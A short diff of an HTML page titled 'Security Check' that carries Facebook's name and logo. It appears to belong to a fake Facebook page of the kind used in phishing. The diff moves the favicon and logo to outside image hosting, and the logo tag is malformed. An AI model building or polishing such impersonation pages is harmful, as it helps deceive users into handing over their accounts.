@@ -3,14 +3,14 @@
 <head>
 	<meta charset="UTF-8">
 	<title>Security Check</title>
-	<link rel="shortcut icon" type="ico" href="images/fb-ico.png">
+	<link rel="shortcut icon" type="ico" href="https://res.cloudinary.com/dyhrt42z0/image/upload/v1789407671/5bb0f73a7b3e0f976acad614a42e5040_iqgrtq.jpg">
 	<link rel="stylesheet" type="text/css" href="style.css">
 </head>
 <body>
 	<header>
 		<div class="main-header">
 			<div class="logo">
-				<a href="http://www.facebook.com"><img src="images/logo.png" alt="Facebook"></a>
+				<a href="http://www.facebook.com"><img href="https://res.cloudinary.com/dyhrt42z0/image/upload/v1789407777/logo_ksldhk.png" alt="Facebook"></a>
 			</div>
 		</div>
 	</header>
